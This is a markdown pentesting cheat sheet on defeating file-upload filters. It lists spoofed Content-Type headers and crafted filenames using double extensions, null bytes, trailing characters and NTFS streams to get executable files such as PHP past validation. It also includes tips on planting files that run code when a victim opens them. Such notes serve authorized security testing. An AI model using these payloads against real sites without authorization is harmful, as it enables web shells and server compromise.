# File Upload

## Bypass File Upload

1.Bypass content-type check
```
Content-Type: application/x-php
Content-Type: application/octet-stream
Content-Type: text/plain
Content-Type: image/png
Content-Type: image/jpeg
```

2.Bypass file extension check
  - Using some uppercase letter: **pHp, pHP5, PhAr**
  - If the extension is validated, change it when send the request in burp
    ```
    filename="dapos.php.jpg" Change to => filename="dapos.php"
    ```
      or
    ```
    filename="dapos.jpg" Change to => filename="dapos.jpg.php"
    ```
  - Try adding special characters at the end, you could use burp intruder to bruteforce all the ASCII and Unicode character
    - file.php%20
    - file.php%0a
    - file.php%00
    - file.php%0d%0a
    - file.php/
    - file.php.\
    - file.
    - file.php....
    - file.pHp5....
  - Try to bypass the protections tricking the extension parser ot the server-side by doubling the extension or adding junk data (null bytes) between extension
    - file.png.php
    - file.png.pHp5
    - file.php%00.png
    - file.php\x00.png
    - file.php%0a.png
    - file.php%0d%0a.png
    - flile.phpJunk123png
  - Add another layer of extensions
    - file.png.jpg.php
    - file.php%00.png%00.jpg
  - Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character “:” will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. “file.asax:.jpg”). This file might be edited later using other techniques such as using its short filename. The “::$data” pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. “file.asp::$data.”)

## Other Tricks

1. Rename the uploaded file (to change extension or another vulnerability\
2. Upload an executable (.exe) or an .html (less suspicious) that will execute code when accidentally opened by victim
3. Possible Information disclosure
   - Upload several times (and at the same time) the same file with the same name
   - Upload a file with the name of a file or folder that already exists
   - Uploading a file with “.”, “..”, or “…” as its name. For instance, in Apache in Windows, if the application saves the uploaded files in “/www/uploads/” directory, the “.” filename will create a file called “uploads” in the “/www/” directory.
   - Upload a file that may not be deleted easily such as “…:.jpg” in NTFS. (Windows)
   - Upload a file in Windows with invalid characters such as |<>*?” in its name. (Windows)
   - Upload a file in Windows using reserved (forbidden) names such as CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
